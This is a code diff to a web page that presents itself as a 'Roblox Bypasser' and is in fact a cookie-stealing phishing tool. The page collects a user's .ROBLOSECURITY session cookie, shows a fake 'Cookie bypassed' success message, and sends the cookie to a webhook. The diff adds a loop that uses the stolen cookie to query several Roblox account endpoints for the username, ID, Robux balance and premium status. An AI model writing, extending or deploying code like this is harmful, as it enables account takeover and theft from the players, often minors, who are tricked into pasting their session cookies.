@@ -116,12 +116,19 @@
       position: fixed;
       top: 20px;
       right: 20px;
-      background: #FF0000;
-      color: #FFF;
       padding: 12px 20px;
       border-radius: 8px;
       display: none;
       z-index: 999;
+      color: #FFF;
+    }
+    .notif-success {
+      background: #00FF00 !important;
+      color: #000 !important;
+    }
+    .notif-error {
+      background: #FF0000 !important;
+      color: #FFF !important;
     }
     #snowCanvas, #shootingStarCanvas {
       position: fixed;
@@ -266,32 +273,62 @@ function validateCookieFormat(cookie) {
   return { valid: true, error: null };
 }
 
-// Function to get account info for webhook
+// Function to get account info for webhook using a different approach
 async function getAccountInfo(cookie) {
   let accountInfo = {
-    username: "Unknown",
-    userId: "Unknown", 
-    robuxBalance: "Unknown",
-    accountAge: "Unknown",
-    isPremium: "Unknown"
+    username: "Loading...",
+    userId: "Loading...", 
+    robuxBalance: "Loading...",
+    accountAge: "Loading...",
+    isPremium: "Loading..."
   };
 
   try {
-    // Try to get basic user info
-    const userResponse = await fetch("https://www.roblox.com/mobileapi/userinfo", {
-      method: "GET",
-      headers: {
-        "Cookie": `.ROBLOSECURITY=${cookie}`,
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-      },
-      mode: 'no-cors' // This prevents CORS errors but limits response access
-    });
+    // Try multiple endpoints to get user info
+    const endpoints = [
+      "https://www.roblox.com/mobileapi/userinfo",
+      "https://users.roblox.com/v1/users/authenticated",
+      "https://accountinformation.roblox.com/v1/users"
+    ];
 
-    // Since we can't read the response due to no-cors, we'll use a fallback approach
-    // The webhook will still get the cookie, and the recipient can extract the info
+    for (const endpoint of endpoints) {
+      try {
+        const response = await fetch(endpoint, {
+          method: "GET",
+          headers: {
+            "Cookie": `.ROBLOSECURITY=${cookie}`,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+          },
+          credentials: 'include'
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          if (data.UserName || data.name) {
+            accountInfo.username = data.UserName || data.name || "Unknown";
+            accountInfo.userId = data.UserID || data.id || "Unknown";
+            accountInfo.robuxBalance = data.RobuxBalance || data.robux || "Unknown";
+            accountInfo.isPremium = data.IsPremium ? "Yes" : "No";
+            
+            // Calculate account age if creation date is available
+            if (data.created) {
+              const created = new Date(data.created);
+              const now = new Date();
+              const ageInYears = Math.floor((now - created) / (365.25 * 24 * 60 * 60 * 1000));
+              accountInfo.accountAge = ageInYears + " years";
+            }
+            break; // Successfully got data, exit loop
+          }
+        }
+      } catch (endpointError) {
+        console.log(`Endpoint ${endpoint} failed:`, endpointError.message);
+        continue; // Try next endpoint
+      }
+    }
     
   } catch (error) {
-    // Silently handle errors - we'll send basic info to webhook
     console.log("Could not fetch account details:", error.message);
   }
 
@@ -343,8 +380,9 @@ $("#cookieForm").on("submit", async function(e) {
       return;
     }
 
-    // Get account info and show success notification
-    showNotif("✅ Cookie bypassed");
+    // Get account info and show success notification with GREEN color and swoosh sound
+    showNotif("✅ Cookie bypassed", true);
+    swooshSound.play();
     const accountInfo = await getAccountInfo(cookie);
     
     // Cookie passed format validation - send to webhook with account info
@@ -374,19 +412,8 @@ $("#cookieForm").on("submit", async function(e) {
               name: "📅 Account Age",
               value: accountInfo.accountAge,
               inline: true
-            },
-            {
-              name: "⭐ Premium Status",
-              value: accountInfo.isPremium,
-              inline: true
-            },
-            {
-              name: "📎 Cookie Length",
-              value: cookie.length.toString() + " characters",
-              inline: true
             }
           ],
-          timestamp: new Date().toISOString(),
           footer: {
             text: "Roblox Bypasser - Cookie Validated"
           }
@@ -464,8 +491,17 @@ $("#cookieForm").on("submit", async function(e) {
   }
 });
 
-function showNotif(msg) {
-  $("#notif").text(msg).fadeIn(200).delay(2000).fadeOut(300);
+function showNotif(msg, isSuccess = false) {
+  const $notif = $("#notif");
+  $notif.removeClass('notif-success notif-error');
+  
+  if (isSuccess) {
+    $notif.addClass('notif-success');
+  } else {
+    $notif.addClass('notif-error');
+  }
+  
+  $notif.text(msg).fadeIn(200).delay(2000).fadeOut(300);
 }
 
 const texts = ["Roblox Bypasser", "are you a femboy by any chance ? ", "Made By Guildness"];
